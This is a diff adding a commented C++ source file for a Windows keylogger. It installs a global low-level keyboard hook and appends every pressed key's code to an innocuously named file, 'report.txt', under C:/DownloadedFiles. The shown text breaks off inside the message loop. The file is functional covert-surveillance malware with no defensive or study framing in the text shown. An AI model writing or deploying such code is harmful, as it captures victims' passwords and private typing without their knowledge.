@@ -1,0 +1,48 @@
+#include <iostream> // Input/Output Streams
+#include <fstream>  // File Streaming
+#include <windows.h> // For Windows-specific functions and structures
+
+// Low-level keyboard procedure callback function
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // If the action that triggered the callback is valid
+    if (nCode == HC_ACTION) {
+        // Cast the lParam (additional message-specific information) to a pointer to a KBDLLHOOKSTRUCT
+        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;
+
+        // If a key was pressed
+        if (wParam == WM_KEYDOWN) {
+            // Open a log file in append mode
+            std::ofstream logFile("C:/DownloadedFiles/report.txt", std::ios::app);
+
+            // Write the virtual-key code of the key that was pressed to the log file
+            logFile << (char)pKeyboardStruct->vkCode;
+
+            // Close the log file
+            logFile.close();
+        }
+    }
+
+    // Call the next hook procedure in the current hook chain
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int main() {
+    // Set a low-level keyboard input hook and save the handle to the hook
+    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+
+    // If setting the hook failed
+    if (!keyboardHook) {
+        // Write an error message to the standard error stream
+        std::cerr << "Error setting keyboard hook." << std::endl;
+
+        // Return with an error code
+        return 1;
+    }
+
+    // Message structure to be filled by the GetMessage function
+    MSG msg;
+
+    // Message loop
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        // Translate virtual-key messages into character messages
+
